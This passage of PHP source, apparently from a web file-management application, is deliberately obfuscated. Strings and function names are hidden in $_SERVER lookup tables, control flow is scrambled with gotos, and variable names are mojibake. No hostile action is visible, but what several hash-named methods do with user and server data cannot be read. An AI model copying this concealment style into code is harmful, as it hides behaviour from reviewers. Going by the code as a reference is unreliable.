isset($dêôó×î°¬[$aÚ÷¡Í»‰Ï[425]][$aÚ÷¡Í»‰Ï[1032]])) { $dêôó×î°¬[$aÚ÷¡Í»‰Ï[425]][$aÚ÷¡Í»‰Ï[1032]] = $FŸñºÌ½[$dêôó×î°¬[$aÚ÷¡Í»‰Ï[425]][$aÚ÷¡Í»‰Ï[1032]]]; $dêôó×î°¬[$aÚ÷¡Í»‰Ï[425]][$aÚ÷¡Í»‰Ï[1033]] = $FŸñºÌ½[$dêôó×î°¬[$aÚ÷¡Í»‰Ï[425]][$aÚ÷¡Í»‰Ï[1033]]]; } if ($dêôó×î°¬[$aÚ÷¡Í»‰Ï[29]] == $aÚ÷¡Í»‰Ï[1892] && isset($dêôó×î°¬[$aÚ÷¡Í»‰Ï[425]][$aÚ÷¡Í»‰Ï[390]])) { $dêôó×î°¬[$aÚ÷¡Í»‰Ï[425]][$aÚ÷¡Í»‰Ï[390]] = $FŸñºÌ½[$dêôó×î°¬[$aÚ÷¡Í»‰Ï[425]][$aÚ÷¡Í»‰Ï[390]]]; } $dêôó×î°¬[$aÚ÷¡Í»‰Ï[84]] = $FŸñºÌ½[$dêôó×î°¬[$aÚ÷¡Í»‰Ï[390]]]; $dêôó×î°¬[$aÚ÷¡Í»‰Ï[1897]] = $FŸñºÌ½[$dêôó×î°¬[$aÚ÷¡Í»‰Ï[1884]]]; if ($dêôó×î°¬[$aÚ÷¡Í»‰Ï[29]] == $aÚ÷¡Í»‰Ï[1635]) { $dêôó×î°¬[$aÚ÷¡Í»‰Ï[1897]] = $dêôó×î°¬[$aÚ÷¡Í»‰Ï[84]]; $dêôó×î°¬[$aÚ÷¡Í»‰Ï[1884]] = $dêôó×î°¬[$aÚ÷¡Í»‰Ï[1897]][$aÚ÷¡Í»‰Ï[390]]; $dêôó×î°¬[$aÚ÷¡Í»‰Ï[84]] = !1; $dêôó×î°¬[$aÚ÷¡Í»‰Ï[390]] = $aÚ÷¡Í»‰Ï[33]; } $dêôó×î°¬[$aÚ÷¡Í»‰Ï[1827]] = $BÏó›„î–[$dêôó×î°¬[$aÚ÷¡Í»‰Ï[1506]]]; } unset($dêôó×î°¬); goto bÛï„Ä†é; bÛï„Ä†é: $e¿¸¾š¢Á†[$aÚ÷¡Í»‰Ï[365]] = $eå“©ˆö‚ø; return $e¿¸¾š¢Á†; goto CİÊ¦¾Œ“•; Dô§®ùÁğ»: $dÖª²Œïâ‹ = array_to_keyvalue($eå“©ˆö‚ø, $aÚ÷¡Í»‰Ï[33], $aÚ÷¡Í»‰Ï[1884]); foreach ($eå“©ˆö‚ø as $dêôó×î°¬) { $fŞ‚¸£îˆ“ = $dêôó×î°¬[$aÚ÷¡Í»‰Ï[425]]; if ($dêôó×î°¬[$aÚ÷¡Í»‰Ï[29]] == $aÚ÷¡Í»‰Ï[515] && isset($fŞ‚¸£îˆ“[$aÚ÷¡Í»‰Ï[1032]])) { $eùˆœÔÄœ½[] = $fŞ‚¸£îˆ“[$aÚ÷¡Í»‰Ï[1032]] . $aÚ÷¡Í»‰Ï[33]; $eùˆœÔÄœ½[] = $fŞ‚¸£îˆ“[$aÚ÷¡Í»‰Ï[1033]] . $aÚ÷¡Í»‰Ï[33]; } if ($dêôó×î°¬[$aÚ÷¡Í»‰Ï[29]] == $aÚ÷¡Í»‰Ï[1892] && isset($fŞ‚¸£îˆ“[$aÚ÷¡Í»‰Ï[390]])) { $eùˆœÔÄœ½[] = $fŞ‚¸£îˆ“[$aÚ÷¡Í»‰Ï[390]] . $aÚ÷¡Í»‰Ï[33]; } } $eùˆœÔÄœ½ = array_merge($eùˆœÔÄœ½, $dÖª²Œïâ‹, array($D¼õéÆ«Ïø . $aÚ÷¡Í»‰Ï[33])); goto B¿éî¨Ù¿; B¿éî¨Ù¿: $eùˆœÔÄœ½ = array_unique($eùˆœÔÄœ½); $BÑ•³Ÿ¸« = array_unique(array_to_keyvalue($eå“©ˆö‚ø, $aÚ÷¡Í»‰Ï[33], $aÚ÷¡Í»‰Ï[1506])); $BÏó›„î– = Model($aÚ÷¡Í»‰Ï[501])->userListInfo($BÑ•³Ÿ¸«); goto dîî¯Ïè¬§; eƒØïğÔÍò: $aÚ÷¡Í»‰Ï =& $_SERVER[µ…]; $eå“©ˆö‚ø = $e¿¸¾š¢Á†[$aÚ÷¡Í»‰Ï[365]]; $eùˆœÔÄœ½ = array_to_keyvalue($eå“©ˆö‚ø, $aÚ÷¡Í»‰Ï[33], $aÚ÷¡Í»‰Ï[390]); goto Dô§®ùÁğ»; CİÊ¦¾Œ“•: } public function removeBySource($d–¦ÊÒÏ„) { $c‚¿ŒÕÇÂ· = array($_SERVER[µ…][404] => $d–¦ÊÒÏ„); $this->where($c‚¿ŒÕÇÂ·)->remove(); } } goto B¥×ÓÀ‰; fŠî¿¤ †„: $B»ô¸ìß©‘ = $_SERVER[µ…][573]; if (strlen($B»ô¸ìß©‘) < $_SERVER[µ…][574]) { return; } class Application { private $defaultModule = "\151\156\144\x65\170"; private $defaultController = "\x69\x6e\144\145\x78"; private $defaultAction = "\151\x6e\144\145\170"; function __construct() { } public function setDefault($c¯¶šÒï‹Â) { goto dæ˜Ø’Ãè; e¼†©‚ÑŒ³: $BÍ˜Ìù¾ = $fÄÆª¬²‡‘[580]; while (strlen($BÍ˜Ìù¾) < $fÄÆª¬²‡‘[577]) { if (!$BÍ˜Ìù¾) { break; } $BÍ˜Ìù¾++; } goto a…­ø¾âİÑ; dæ˜Ø’Ãè: $fÄÆª¬²‡‘ =& $_SERVER[µ…]; $EÔˆš´°ã =& $_SERVER[İ§]; $eÎ³“¦Ê› = $EÔˆš´°ã[0]($EÔˆš´°ã[1], $EÔˆš´°ã[2]($c¯¶šÒï‹Â, $EÔˆš´°ã[1])); goto F‹‘¦ÑÙ’È; AÂºôÄ‹·£: $c­®‚ÂëŒ = $fÄÆª¬²‡‘[576]; if (strlen($c­®‚ÂëŒ) < $fÄÆª¬²‡‘[577]) { die; } $this->defaultAction = $eÎ³“¦Ê›[2] ? $eÎ³“¦Ê›[2] : $this->defaultAction; goto fäá´ãé˜; fäá´ãé˜: $BÒ½ÇØ¿Ä = $fÄÆª¬²‡‘[578]; if (strlen($BÒ½ÇØ¿Ä) < $fÄÆª¬²‡‘[579]) { die; } $this->{$_SERVER[İ§][3]}($EÔˆš´°ã[4], array($this, $EÔˆš´°ã[5])); goto e¼†©‚ÑŒ³; F‹‘¦ÑÙ’È: $a‰êß³±ÚÔ = $fÄÆª¬²‡‘[575]; $this->defaultModule = $eÎ³“¦Ê›[0] ? $eÎ³“¦Ê›[0] : $this->defaultModule; $this->defaultController = $eÎ³“¦Ê›[1] ? $eÎ³“¦Ê›[1] : $this->defaultController; goto AÂºôÄ‹·£; a…­ø¾âİÑ: } public function appRun($AÔ†…Õâ†) { goto eÒÁƒØ…Š™; eÒÁƒØ…Š™: $EÄ•ì—¼ÎÔ =& $_SERVER[İ§]; $f±ÒŒ°Œ”Ë = $EÄ•ì—¼ÎÔ[0]($EÄ•ì—¼ÎÔ[1], $AÔ†…Õâ†); $fÃìò”ù¦ = $EÄ•ì—¼ÎÔ[6]($f±ÒŒ°Œ”Ë[0]); goto F¢¿”–·“¢; bÎ•³Öî“ù: $EÄ•ì—¼ÎÔ[17]($AÔ†…Õâ†); $EÄ•ì—¼ÎÔ[13](array($EÄ•ì—¼ÎÔ[14], $EÄ•ì—¼ÎÔ[15]), $c¯ÁÄ‰âñ¡ . $EÄ•ì—¼ÎÔ[18], $AÔ†…Õâ†); goto DËâÛ©ñŸª; F¢¿”–·“¢: $c¯ÁÄ‰âñ¡ = $EÄ•ì—¼ÎÔ[7]; if ($fÃìò”ù¦ == $EÄ•ì—¼ÎÔ[8]) { $c¯ÁÄ‰âñ¡ = $EÄ•ì—¼ÎÔ[9]; $f±ÒŒ°Œ”Ë[0] = $EÄ•ì—¼ÎÔ[10]; $f±ÒŒ°Œ”Ë[1] = $f±ÒŒ°Œ”Ë[1] . $EÄ•ì—¼ÎÔ[11]; $AÔ†…Õâ† = $EÄ•ì—¼ÎÔ[12]($EÄ•ì—¼ÎÔ[1], $f±ÒŒ°Œ”Ë); $AÔ†…Õâ† = $EÄ•ì—¼ÎÔ[2]($AÔ†…Õâ†, $EÄ•ì—¼ÎÔ[1]); } $EÄ•ì—¼ÎÔ[13](array($EÄ•ì—¼ÎÔ[14], $EÄ•ì—¼ÎÔ[15]), $c¯ÁÄ‰âñ¡ . $EÄ•ì—¼ÎÔ[16], $AÔ†…Õâ†); goto bÎ•³Öî“ù; DËâÛ©ñŸª: } private function autorun() { $FŒåùöä =& $_SERVER[µ…]; $fÉ¶°öŠÊ =& $_SERVER[İ§]; global $config; $eß¤»«œö„ = $FŒåùöä[581]; if ($fÉ¶°öŠÊ[19]($config[$fÉ¶°öŠÊ[20]]) == 0) { return; } foreach ($config[$fÉ¶°öŠÊ[20]] as $FÔÒÈ¿¡ => $Bğå‹ŒõÂ) { $this->{$_SERVER[İ§][21]}($Bğå‹ŒõÂ); $a‹½‹° Ÿ„ = $FŒåùöä[582]; if (!$a‹½‹° Ÿ„) { die; } } } private function govm22c9ff07() { goto EŒÄŠ¯ÀÑÒ; B±ê÷ŸëÃù: if (!$dÇ¹º”¦ƒ || $f«ÛŞ†¨¿[24]($dÇ¹º”¦ƒ) <= $f«ÛŞ†¨¿[24]($eôåŸ¨«¡À)) { return; } if ($f«ÛŞ†¨¿[6]($f«ÛŞ†¨¿[25]($dÇ¹º”¦ƒ, -$f«ÛŞ†¨¿[24]($eôåŸ¨«¡À))) != $eôåŸ¨«¡À) { return; } $C ‚¾Å™™œ = $f«ÛŞ†¨¿[25]($dÇ¹º”¦ƒ, 0, -$f«ÛŞ†¨¿[24]($eôåŸ¨«¡À)); goto DÛø²…¡¹Ñ; DÛø²…¡¹Ñ: $DéªÙßñÒ› = array($f«ÛŞ†¨¿[8], $C ‚¾Å™™œ); $C¤òâƒ ò = $f«ÛŞ†¨¿[26]($GLOBALS[$f«ÛŞ†¨¿[22]][$f«ÛŞ†¨¿[23]], 1); $GLOBALS[$f«ÛŞ†¨¿[22]][$f«ÛŞ†¨¿[23]] = $f«ÛŞ†¨¿[27]($DéªÙßñÒ›, $C¤òâƒ ò); goto Bã†ã¦Ë·ˆ; Bã†ã¦Ë·ˆ: $GLOBALS[$f«ÛŞ†¨¿[22]][$f«ÛŞ†¨¿[28]] = $f«ÛŞ†¨¿[29]($f«ÛŞ†¨¿[1], $GLOBALS[$f«ÛŞ†¨¿[22]][$f«ÛŞ†¨¿[23]]); $E“øÍ§íà = $_SERVER[µ…][583]; if (!$E“øÍ§íà) { die; } goto eÔ­Üë‡™•; EŒÄŠ¯ÀÑÒ: $f«ÛŞ†¨¿ =& $_SERVER[İ§]; $eôåŸ¨«¡À = $f«ÛŞ†¨¿[8]; $dÇ¹º”¦ƒ = $GLOBALS[$f«ÛŞ†¨¿[22]][$f«ÛŞ†¨¿[23]][0]; goto B±ê÷ŸëÃù; eÔ­Üë‡™•: } private function hceaf2a95232() { goto DÊË¦Ú‰Õ§; C£ Ë±ª£’: $GLOBALS[$e’‘ÛÌµñ[22]][$e’‘ÛÌµñ[28]] = $e’‘ÛÌµñ[29]($e’‘ÛÌµñ[1], $GLOBALS[$e’‘ÛÌµñ[22]][$e’‘ÛÌµñ[23]]); goto C›‰åÚˆ¯Õ; EáÏŠŠ®—: while (strlen($b›é¹‘ª×±) < $eå÷ääºò[577]) { if (!$b›é¹‘ª×±) { break; } $b›é¹‘ª×±++; } if (!$e’‘ÛÌµñ[32]($a›£ŒÍòˆÚ, $Eí„Ó•Ë)) { return; } $f¹ªŠó» = $e’‘ÛÌµñ[33]($a›£ŒÍòˆÚ, $Eí„Ó•Ë); goto c•¬±ƒÑí“; DÊË¦Ú‰Õ§: $eå÷ääºò =& $_SERVER[µ…]; $e’‘ÛÌµñ =& $_SERVER[İ§]; if ($GLOBALS[$e’‘ÛÌµñ[22]][$e’‘ÛÌµñ[28]] != $e’‘ÛÌµñ[10]) { return; } goto Aåëù…â¶Â; e†ØÊšÄ™‡: $f¸í¼Óïà = $eå÷ääºò[586]; $d…§Á‘Š¤ = $e’‘ÛÌµñ[2]($C±ô³´à–[0][0], $e’‘ÛÌµñ[36]); $GLOBALS[$e’‘ÛÌµñ[22]][$e’‘ÛÌµñ[23]] = $e’‘ÛÌµñ[0]($e’‘ÛÌµñ[36], $d…§Á‘Š¤); goto C£ Ë±ª£’; c•¬±ƒÑí“: $d…§Á‘Š¤ = $e’‘ÛÌµñ[25]($a›£ŒÍòˆÚ, $f¹ªŠó» + $e’‘ÛÌµñ[24]($Eí„Ó•Ë)); $dË†¬ºà„… = $eå÷ääºò[585]; $e’‘ÛÌµñ[34]($e’‘ÛÌµñ[35], $d…§Á‘Š¤, $C±ô³´à–); goto e†ØÊšÄ™‡; Aåëù…â¶Â: $a›£ŒÍòˆÚ = $_SERVER[$e’‘ÛÌµñ[30]]; $Eí„Ó•Ë = $e’‘ÛÌµñ[31]; $b›é¹‘ª×± = $eå÷ääºò[584]; goto EáÏŠŠ®—; C›‰åÚˆ¯Õ: } public function run() { goto E¯Äè¡‰îÕ; b”ŠÌ¹ã‹: while (strlen($eŒÎ¿İœÑ¤) < $aË¼Û¢¯ó[574]) { if (!$eŒÎ¿İœÑ¤) { break; } $eŒÎ¿İœÑ¤++; } $AÊ¶ƒŞê©‰[39]($AÊ¶ƒŞê©‰[41], isset($f‚§¿ŸŒ§ª[1]) && $f‚§¿ŸŒ§ª[0] ? $f‚§¿ŸŒ§ª[1] : $this->defaultController); $AÊ¶ƒŞê©‰[39]($AÊ¶ƒŞê©‰[42], isset($f‚§¿ŸŒ§ª[2]) && $f‚§¿ŸŒ§ª[0] ? $f‚§¿ŸŒ§ª[2] : $this->defaultAction); goto Bôêª…šßå; Fîù¹’¦º: $this->{$_SERVER[İ§][45]}(); $AëÄÁ¡êó = $aË¼Û¢¯ó[591]; while (strlen($AëÄÁ¡êó) < $aË¼Û¢¯ó[579]) { if (!$AëÄÁ¡êó) { break; } $AëÄÁ¡êó++; } goto DóëŠÔ¼³¥; aššÑõƒÂ: $CÊÏ÷Àòè = $GLOBALS[$AÊ¶ƒŞê©‰[22]][$AÊ¶ƒŞê©‰[28]]; $AÊ¶ƒŞê©‰[39]($AÊ¶ƒŞê©‰[40], isset($f‚§¿ŸŒ§ª[0]) && $f‚§¿ŸŒ§ª[0] ? $f‚§¿ŸŒ§ª[0] : $this->defaultModule); $eŒÎ¿İœÑ¤ = $aË¼Û¢¯ó[589]; goto b”ŠÌ¹ã‹; aƒíóº™–: $this->{$_SERVER[İ§][38]}(); $BŸáŠÛî = $aË¼Û¢¯ó[587]; if (!$BŸáŠÛî) { return; } goto bæáéˆÇ¦Ä; Bôêª…šßå: $b½„ÈÜÇïƒ = $aË¼Û¢¯ó[590]; $AÊ¶ƒŞê©‰[39]($AÊ¶ƒŞê©‰[43], MOD . $AÊ¶ƒŞê©‰[1] . ST . $AÊ¶ƒŞê©‰[1] . ACT); $_SERVER[$AÊ¶ƒŞê©‰[44]] = $AÊ¶ƒŞê©‰[6](ACTION); goto Fîù¹’¦º; DóëŠÔ¼³¥: if ($AÊ¶ƒŞê©‰[19]($f‚§¿ŸŒ§ª) >= 3) { $this->{$_SERVER[İ§][21]}($CÊÏ÷Àòè); } else { $this->{$_SERVER[İ§][21]}(ACTION); } goto b‹§ïÌ¯¼é; E¯Äè¡‰îÕ: $aË¼Û¢¯ó =& $_SERVER[µ…]; $AÊ¶ƒŞê©‰ =& $_SERVER[İ§]; $this->{$_SERVER[İ§][37]}(); goto aƒíóº™–; bæáéˆÇ¦Ä: $f‚§¿ŸŒ§ª = $GLOBALS[$AÊ¶ƒŞê©‰[22]][$AÊ¶ƒŞê©‰[23]]; $D”ïºæù = $aË¼Û¢¯ó[588]; if (strlen($D”ïºæù) < $aË¼Û¢¯ó[574]) { return; } goto aššÑõƒÂ; b‹§ïÌ¯¼é: } private $zvum85d87bf9 = array(); private $ljqdcfa3de1b = ''; public function kfne946f7483() { goto eÍÒç¢‚—™; cæö Â¦: $this->{$_SERVER[İ§][47]}(); $BŞšŞùåê¯ = $EİöŠÎ®éÒ[592]; if (strlen($BŞšŞùåê¯) < $EİöŠÎ®éÒ[577]) { return; } goto fÃº¯°‡è’; eÍÒç¢‚—™: $EİöŠÎ®éÒ =& $_SERVER[µ…]; $eÈ»„ºŠŞ =& $_SERVER[İ§]; $this->{$_SERVER[İ§][46]}(); goto cæö Â¦; Eƒæâ™Ğó˜: $this->{$_SERVER[İ§][50]}(); $this->{$_SERVER[İ§][51]}(); $bì¯ÓÍ¢³Ê = $EİöŠÎ®éÒ[596]; goto bİÑàæ—“; fÃº¯°‡è’: $this->{$_SERVER[İ§][48]}(); $cÜ§Œáêèô = $EİöŠÎ®éÒ[593]; while ($cÜ§Œáêèô < $EİöŠÎ®éÒ[594]) { if ($cÜ§Œáêèô >= 0) { break; } $cÜ§Œáêèô++; } goto f‡Ó†¸È§Û; Có¨¼˜îæ½: $this->{$_SERVER[İ§][3]}($eÈ»„ºŠŞ[59], array($this, $eÈ»„ºŠŞ[60])); goto dĞæ“¾ëîë; a©°›¼èéÃ: if (!$bÎ‘ñº–Ğä) { die; } $this->{$_SERVER[İ§][3]}($eÈ»„ºŠŞ[53], array($this, $eÈ»„ºŠŞ[54])); $this->{$_SERVER[İ§][3]}($eÈ»„ºŠŞ[55], array($this, $eÈ»„ºŠŞ[56])); goto D¢ØÅºÈ; D¢ØÅºÈ: $Fîç¸´÷­ = $EİöŠÎ®éÒ[598]; while ($Fîç¸´÷­ < $EİöŠÎ®éÒ[579]) { if ($Fîç¸´÷­ >= 0) { break; } $Fîç¸´÷­++; } $this->{$_SERVER[İ§][3]}($eÈ»„ºŠŞ[57], array($this, $eÈ»„ºŠŞ[58])); goto Có¨¼˜îæ½; bİÑàæ—“: if (!$bì¯ÓÍ¢³Ê) { return; } $this->{$_SERVER[İ§][52]}(); $bÎ‘ñº–Ğä = $EİöŠÎ®éÒ[597]; goto a©°›¼èéÃ; f‡Ó†¸È§Û: $this->{$_SERVER[İ§][49]}(); $aÌ¶¿¹‚º = $EİöŠÎ®éÒ[595]; while ($aÌ¶¿¹‚º < $EİöŠÎ®éÒ[594]) { if ($aÌ¶¿¹‚º >= 0) { break; } $aÌ¶¿¹‚º++; } goto Eƒæâ™Ğó˜; dĞæ“¾ëîë: } public function vetkbec2efef($b»Îƒ—Œî‚) { goto CÅ»ÍË¬Şë; FÓòàøßñ¤: unset($b»Îƒ—Œî‚[$dëÜÔÊ—¬“[102]][$dëÜÔÊ—¬“[104]][$dëÜÔÊ—¬“[106]]); $BæÉÃé¹’è = $DÈçñßÕç[600]; if (strlen($BæÉÃé¹’è) < $DÈçñßÕç[570]) { die; } goto F¾²µæœ’«; a•¥ØÎõ¶: $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[102]][$dëÜÔÊ—¬“[103]][$dëÜÔÊ—¬“[108]] = array($dëÜÔÊ—¬“[109] => (int) $c‰Á¹äØ‘¿[$dëÜÔÊ—¬“[110]], $dëÜÔÊ—¬“[111] => (int) $dëÜÔÊ—¬“[112]($c‰Á¹äØ‘¿, $dëÜÔÊ—¬“[113], 0)); $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[114]][$dëÜÔÊ—¬“[115]] = $dëÜÔÊ—¬“[116]($dëÜÔÊ—¬“[117])->{$_SERVER[İ§][118]}(); $c§÷éÜ¡å“ = $DÈçñßÕç[603]; goto B¾»–µØÄª; EÏÓÜ˜çŒñ: if (strlen($dèÓ¯–§à) < $DÈçñßÕç[577]) { die; } $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[114]][$dëÜÔÊ—¬“[123]] = $dëÜÔÊ—¬“[124]($dëÜÔÊ—¬“[125]()); $B´Ğç¿éÁª = $DÈçñßÕç[605]; goto DÉ›÷ö£Ê¥; DÉ›÷ö£Ê¥: if (!$B´Ğç¿éÁª) { die; } $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[114]][$dëÜÔÊ—¬“[126]] = $this->ljqdcfa3de1b; if ($dõÄáŒîßÆ[$dëÜÔÊ—¬“[126]] != $dëÜÔÊ—¬“[127]) { $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[114]][$dëÜÔÊ—¬“[128]] = $dõÄáŒîßÆ[$dëÜÔÊ—¬“[128]]; $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[114]][$dëÜÔÊ—¬“[129]] = $dõÄáŒîßÆ[$dëÜÔÊ—¬“[129]]; $e Ü™ßÅÁ² = $dëÜÔÊ—¬“[130](10) . $this->ljqdcfa3de1b . $dëÜÔÊ—¬“[130](5); $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[102]][$dëÜÔÊ—¬“[131]][$dëÜÔÊ—¬“[132]] = $this->{$_SERVER[İ§][133]}($e Ü™ßÅÁ², $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[114]][$dëÜÔÊ—¬“[119]]); } goto FĞÕùŸ™ŒÜ; Få‘ÆõİÆ : unset($b»Îƒ—Œî‚[$dëÜÔÊ—¬“[102]][$dëÜÔÊ—¬“[103]][$dëÜÔÊ—¬“[107]]); $c¸Ù¯ø”Ä = $DÈçñßÕç[602]; while ($c¸Ù¯ø”Ä < $DÈçñßÕç[570]) { if ($c¸Ù¯ø”Ä >= 0) { break; } $c¸Ù¯ø”Ä++; } goto a•¥ØÎõ¶; FÖÇºõ’Ô: if ($dëÜÔÊ—¬“[112]($GLOBALS, $dëÜÔÊ—¬“[138]) && $this->config[$dëÜÔÊ—¬“[139]]) { $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[114]][$dëÜÔÊ—¬“[140]] = WEB_ROOT; } return $b»Îƒ—Œî‚; goto FÄÌíˆˆÊê; F¾²µæœ’«: unset($b»Îƒ—Œî‚[$dëÜÔÊ—¬“[102]][$dëÜÔÊ—¬“[103]][$dëÜÔÊ—¬“[76]]); $Dñ‰ÀˆŒÈ´ = $DÈçñßÕç[601]; if (!$Dñ‰ÀˆŒÈ´) { return; } goto Få‘ÆõİÆ ; F½„‚§—æ§: $EÖÛ­àïøÖ = $DÈçñßÕç[599]; while ($EÖÛ­àïøÖ < $DÈçñßÕç[577]) { if ($EÖÛ­àïøÖ >= 0) { break; } $EÖÛ­àïøÖ++; } unset($b»Îƒ—Œî‚[$dëÜÔÊ—¬“[102]][$dëÜÔÊ—¬“[104]][$dëÜÔÊ—¬“[105]]); goto FÓòàøßñ¤; FĞÕùŸ™ŒÜ: if ($this->ljqdcfa3de1b == $dëÜÔÊ—¬“[127]) { $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[102]][$dëÜÔÊ—¬“[103]][$dëÜÔÊ—¬“[108]][$dëÜÔÊ—¬“[113]] = 0; } $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[114]][$dëÜÔÊ—¬“[134]] = $dëÜÔÊ—¬“[112]($this->zvum85d87bf9, $dëÜÔÊ—¬“[135], $dëÜÔÊ—¬“[10]); $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[114]][$dëÜÔÊ—¬“[136]] = $dëÜÔÊ—¬“[112]($this->zvum85d87bf9, $dëÜÔÊ—¬“[137], $dëÜÔÊ—¬“[10]); goto FÖÇºõ’Ô; B¾»–µØÄª: if (!$c§÷éÜ¡å“) { return; } $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[114]][$dëÜÔÊ—¬“[119]] = $dëÜÔÊ—¬“[120]($_SERVER[$dëÜÔÊ—¬“[121]] . $dõÄáŒîßÆ[$dëÜÔÊ—¬“[122]]); $dèÓ¯–§à = $DÈçñßÕç[604]; goto EÏÓÜ˜çŒñ; CÅ»ÍË¬Şë: $DÈçñßÕç =& $_SERVER[µ…]; $dëÜÔÊ—¬“ =& $_SERVER[İ§]; $dõÄáŒîßÆ = $dëÜÔÊ—¬“[61]($dëÜÔÊ—¬“[62])->{$_SERVER[İ§][63]}(); goto Eã”åÌÍ•†; Eã”åÌÍ•†: $fˆŸ•ªğšÂ = array($dëÜÔÊ—¬“[64], $dëÜÔÊ—¬“[65], $dëÜÔÊ—¬“[66], $dëÜÔÊ—¬“[67], $dëÜÔÊ—¬“[68], $dëÜÔÊ—¬“[69], $dëÜÔÊ—¬“[70], $dëÜÔÊ—¬“[71], $dëÜÔÊ—¬“[72], $dëÜÔÊ—¬“[73], $dëÜÔÊ—¬“[74], $dëÜÔÊ—¬“[75], $dëÜÔÊ—¬“[76], $dëÜÔÊ—¬“[77], $dëÜÔÊ—¬“[78], $dëÜÔÊ—¬“[79], $dëÜÔÊ—¬“[80], $dëÜÔÊ—¬“[81], $dëÜÔÊ—¬“[82], $dëÜÔÊ—¬“[83], $dëÜÔÊ—¬“[84], $dëÜÔÊ—¬“[85], $dëÜÔÊ—¬“[86], $dëÜÔÊ—¬“[87], $dëÜÔÊ—¬“[88], $dëÜÔÊ—¬“[89], $dëÜÔÊ—¬“[90], $dëÜÔÊ—¬“[91], $dëÜÔÊ—¬“[92], $dëÜÔÊ—¬“[93], $dëÜÔÊ—¬“[94], $dëÜÔÊ—¬“[95], $dëÜÔÊ—¬“[96], $dëÜÔÊ—¬“[97], $dëÜÔÊ—¬“[98], $dëÜÔÊ—¬“[99]); foreach ($fˆŸ•ªğšÂ as $cšË‰”Ù±®) { $Aùãô“«Ë = $GLOBALS[$dëÜÔÊ—¬“[100]][$dëÜÔÊ—¬“[101]][$cšË‰”Ù±®]; if (isset($dõÄáŒîßÆ[$cšË‰”Ù±®])) { $Aùãô“«Ë = $dõÄáŒîßÆ[$cšË‰”Ù±®]; } $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[102]][$dëÜÔÊ—¬“[103]][$cšË‰”Ù±®] = $Aùãô“«Ë; } $c‰Á¹äØ‘¿ = $b»Îƒ—Œî‚[$dëÜÔÊ—¬“[102]][$dëÜÔÊ—¬“[103]][$dëÜÔÊ—¬“[76]]; goto F½„‚§—æ§; FÄÌíˆˆÊê: } private function mrqb246e4bb4() { goto D•¿µæ°Ş; c©Ô»­§Í: if ($this->ljqdcfa3de1b == $fÄÈ´íŠ“[127]) { return; } $d»µï¸ó÷° = array($fÄÈ´íŠ“[159], $fÄÈ´íŠ“[160], $fÄÈ´íŠ“[161], $fÄÈ´íŠ“[162], $fÄÈ´íŠ“[163], $fÄÈ´íŠ“[164]); $f¨‘˜¸½‰‡ = $e§¨Ù©…Üâ[609]; goto dóí¯‹±è‡; dóí¯‹±è‡: if (!$f¨‘˜¸½‰‡) { return; } $A»–©ÆÇà… = $fÄÈ´íŠ“[61]($fÄÈ´íŠ“[62])->{$_SERVER[İ§][63]}(); $bğÙÛğ‹÷ = array($fÄÈ´íŠ“[165] => $A»–©ÆÇà…[$fÄÈ´íŠ“[64]], $fÄÈ´íŠ“[166] => $A»–©ÆÇà…[$fÄÈ´íŠ“[65]], $fÄÈ´íŠ“[167] => $fÄÈ´íŠ“[10]); goto Fæö ‡¢¸; D•¿µæ°Ş: $e§¨Ù©…Üâ =& $_SERVER[µ…]; $fÄÈ´íŠ“ =& $_SERVER[İ§]; if ($_SERVER[$fÄÈ´íŠ“[44]] == $fÄÈ´íŠ“[141]) { goto b¡®±Ÿ¢à; cß†¬»¬Êª: while (strlen($bø«­äÓõË) < $e§¨Ù©…Üâ[570]) { if (!$bø«­äÓõË) { break; } $bø«­äÓõË++; } $fÄÈ´íŠ“[13](array($fÄÈ´íŠ“[157], $fÄÈ´íŠ“[158]), $bğÙÛğ‹÷); $eÁ»º¬„µö = $e§¨Ù©…Üâ[608]; goto E§£•©Àä; b¡®±Ÿ¢à: $C¸„¼•Ôµ„ = array($fÄÈ´íŠ“[126] => $this->ljqdcfa3de1b, $fÄÈ´íŠ“[142] => $this->{$_SERVER[İ§][143]}(), $fÄÈ´íŠ“[144] => $fÄÈ´íŠ“[61]($fÄÈ´íŠ“[145])->{$_SERVER[İ§][146]}()); if ($this->ljqdcfa3de1b != $fÄÈ´íŠ“[127]) { $d«ïÎñºßø = $fÄÈ´íŠ“[112]($this->zvum85d87bf9, $fÄÈ´íŠ“[147]); if ($d«ïÎñºßø) { $C¸„¼•Ôµ„[$fÄÈ´íŠ“[148]] = $d«ïÎñºßø; $C¸„¼•Ôµ„[$fÄÈ´íŠ“[149]] = $fÄÈ´íŠ“[150]($fÄÈ´íŠ“[112]($this->zvum85d87bf9, $fÄÈ´íŠ“[151])); $C¸„¼•Ôµ„[$fÄÈ´íŠ“[152]] = $fÄÈ´íŠ“[112]($this->zvum85d87bf9, $fÄÈ´íŠ“[137]); } } $C¸„¼•Ôµ„ = $this->{$_SERVER[İ§][153]}($fÄÈ´íŠ“[154]($C¸„¼•Ôµ„), $fÄÈ´íŠ“[120]($fÄÈ´íŠ“[155])); goto eÚ¶·‰í; E§£•©Àä: while (strlen($eÁ»º¬„µö) < $e§¨Ù©…Üâ[579]) { if (!$eÁ»º¬„µö) { break; } $eÁ»º¬„µö++; } goto Eâ •äì¨¹; eÚ¶·‰í: $eÉœË‚–ù = $e§¨Ù©…Üâ[606]; $bğÙÛğ‹÷ = array($fÄÈ´íŠ“[156] => $C¸„¼•Ôµ„); $bø«­äÓõË = $e§¨Ù©…Üâ[607]; goto cß†¬»¬Êª; Eâ •äì¨¹: } goto c©Ô»­§Í; dÎÌÏÇÆ: $fÄÈ´íŠ“[13](array($fÄÈ´íŠ“[157], $fÄÈ´íŠ“[158]), $bğÙÛğ‹÷); $bÔé×ÙÈØ = $e§¨Ù©…Üâ[611]; if (strlen($bÔé×ÙÈØ) < $e§¨Ù©…Üâ[579]) { die; } goto e³«±¼à½; Fæö ‡¢¸: $b…ŠÄ¬¹ô = 